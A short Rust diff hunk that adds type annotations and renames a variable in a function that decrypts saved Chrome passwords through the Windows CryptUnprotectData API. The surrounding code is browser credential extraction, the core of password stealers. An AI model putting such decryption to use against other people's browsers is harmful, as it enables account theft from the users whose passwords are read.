@@ -16,20 +16,20 @@ impl ChromeAccount {
 
     fn get_clear_text_pw(&mut self) -> String {
         unsafe {
-            let vec_ptr = *&self.password_value.as_mut_ptr();
-            let vec_len = &self.password_value.len();
+            let vec_ptr: *mut u8 = *&self.password_value.as_mut_ptr();
+            let vec_len: &usize = &self.password_value.len();
             let mut data_in: DATA_BLOB = CRYPTOAPI_BLOB { cbData: *vec_len as u32, pbData: vec_ptr };
             let mut data_out: DATA_BLOB = CRYPTOAPI_BLOB { cbData: 0, pbData: &mut 0 };
             let mut p_descr_out: LPWSTR = std::ptr::null_mut();
 
-            let ok = CryptUnprotectData(&mut data_in,
+            let succ_unprotect = CryptUnprotectData(&mut data_in,
                                         &mut p_descr_out,
                                         std::ptr::null_mut(),
                                         std::ptr::null_mut(),
                                         std::ptr::null_mut(),
                                         0,
                                         &mut data_out);
-            if ok == 0 {
+            if succ_unprotect == 0 {
                 panic!("Failed to decrypt");
             }
 
